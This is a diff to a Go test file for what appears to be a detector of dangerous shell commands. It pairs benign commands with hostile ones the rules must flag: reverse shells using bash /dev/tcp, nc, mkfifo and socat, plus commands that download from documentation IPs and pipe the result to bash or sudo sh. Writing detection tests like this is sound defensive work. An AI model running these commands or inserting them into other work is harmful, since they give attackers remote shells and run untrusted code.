@@ -25,8 +25,8 @@ func TestCommandRules(t *testing.T) {
 	}{
 		{"cmd-reverse-shell", []string{"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "nc -e /bin/sh 203.0.113.9 4444",
 			"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.9 4444 >/tmp/f",
-			`python3 -c 'import socket,subprocess,os;s=socket.socket()'`},
-			[]string{"nc -zv example.com 80", "bash -c 'echo hi'"}},
+			`python3 -c 'import socket,subprocess,os;s=socket.socket()'`, "socat TCP:203.0.113.9:4444 EXEC:/bin/bash,pty,stderr"},
+			[]string{"nc -zv example.com 80", "bash -c 'echo hi'", "socat TCP-LISTEN:23,fork,reuseaddr EXEC:/usr/sbin/in.telnetd"}},
 		{"cmd-download-exec", []string{"curl -s http://198.51.100.7/x.sh | bash", "wget -qO- http://198.51.100.7/i | sudo sh"},
 			[]string{"curl -s http://example.com/api | jq .", "wget http://example.com/a.tar.gz"}},
 		{"cmd-download-tmp", []string{"wget http://198.51.100.7/a -O /tmp/a", "curl -o /dev/shm/k http://198.51.100.7/k"},
